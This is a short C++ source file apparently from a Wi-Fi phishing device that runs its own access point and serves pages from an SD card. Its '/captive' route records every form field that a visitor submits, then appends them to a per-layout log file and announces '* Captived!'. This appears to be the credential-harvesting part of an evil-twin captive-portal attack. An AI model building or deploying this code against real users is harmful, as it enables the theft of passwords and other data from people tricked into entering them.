#include "App.h"

bool App::_initServer() {
  INFO("Initializing server...");

  if (!this->server.init(this->wifi.apip, this->_routes)) {
    this->addLog("[ER] Server init");
    return false;
  }

  for (int i = 0; i < this->server.routes.size(); i += 1) {
    Route route = this->server.routes[i];
    if (!this->_sd.exists(route.fileName)) {
      this->addLog("[ER] Route " + route.route);
      return false;
    }
  }

  this->addLog("[OK] Routes (" + String(this->server.routes.size()) + ")");
  this->addLog("[OK] Server");

  this->server.route("/captive", [this](AsyncWebServerRequest *request) {
    this->incStat(STATS_CAPTIVE);

    this->addLog("* Captived!");

    if (request->params() > 0) {
      String params = "";

      for (int i = 0; i < request->params(); i++) {
        if (i > 0) {
          params += "&";
        }

        params += request->getParam(i)->name() + "=" + request->getParam(i)->value();
      }

      this->addLog("* Saving logs...");

      if (this->_sd.append("/captive_logs_" + this->_config[CONFIG_LAYOUT] + ".txt", params)) {
        this->addLog("* Done!");
      }
    }
  });

  this->server.on([this](Route route) {
    this->incStat(STATS_REQUESTS);

    this->addLog("GET " + route.route);
  });

  INFO("Server initialized!");

  return true;
}
